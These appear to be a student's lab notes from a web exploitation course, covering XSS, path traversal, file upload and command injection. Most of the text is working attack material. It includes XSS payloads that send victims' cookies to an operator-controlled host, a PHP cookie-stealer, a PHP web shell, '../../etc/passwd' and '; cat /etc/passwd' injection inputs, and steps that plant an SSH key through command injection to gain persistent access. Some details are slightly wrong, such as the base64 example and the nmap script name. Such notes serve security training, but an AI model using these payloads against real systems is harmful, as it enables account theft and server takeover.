Stored XSS
HTTP Response Codes
10X == Informational

2XX == Success

30X == Redirection

4XX == Client Error

5XX == Server Error

https://tools.ietf.org/html/rfc2616

Reflected XSS
Most common form of XSS

Transient, occurs in error messages or search results

Delivered through intermediate media, such as a link in an email

Characters that are normally illegal in URLs can be Base64 encoded

Below is what you see, but the server will decode as name=abc123
http://example.com/page.php?name=dXNlcjEyMw

Stored XSS
Resides on vulnerable site

Only requires user to visit page

<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">

Proof of concept (simple alert):

<script>alert('XSS');</script>


Capturing Cookies
document.cookie

Capturing Keystrokes

bind KEYDOWN and KEYUP

Capturing Sensitive Data
document.body.innerHTML


Server-Side injection
Directory Traversal/Path Traversal

Ability to read/execute outside web server’s directory

Uses ../../ (relative paths) in manipulating a server-side file path

view_image.php?file=../../etc/passwd

Malicious File Upload
Site allows unsanitized file uploads

Server doesn’t validate extension or size

Allows for code execution (shell)

Once uploaded
	Find your file
	Call your file
	
Command Injection
Application on the server is vulnerable,
allowing execution of arbitrary commands

User input not validated
	Common example is a SOHO router, with a web page to allow ping

Might contain the following in it’s code:
system("ping -c 1 ".$_GET["ip"]);

Run the following to chain/stack our arbitrary command
; cat /etc/passwd

nmap --script=http-nmum.nse 10.50.37.95 -p 80
sudo apt install nikto
nikto -host 10.50.37.95

<script>document.location="http://OPSTATION IP:8000/"+document.cookie;</script>
Run this on your opstation: python3 -m http.server


cookiestealer.php
<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>

touch cookiefile.txt

<script>document.location="http:theSERVER/uploads/cookie_stealer.php?username="+document.cookie;</script>


webshell.php
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<? php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>

====================================================================================================================================================

ssh-keygen -t rsa -b 4096
enter,enter,enter

cat ~/.ssh/id_rsa.pub id_rsa

copy it

command injection
;mkdir .ssh

; ls -la /var/www/.ssh

; echo "paste the copied key" > /var/www/.ssh/authorized_keys

ssh -i .ssh/id_rsa www-data@10.50.37.95
======================================================================================================================================================
just use the Guide:

https://sec.cybbh.io/public/security/latest/lessons/lesson-4-xss_sg.html#_command_injection
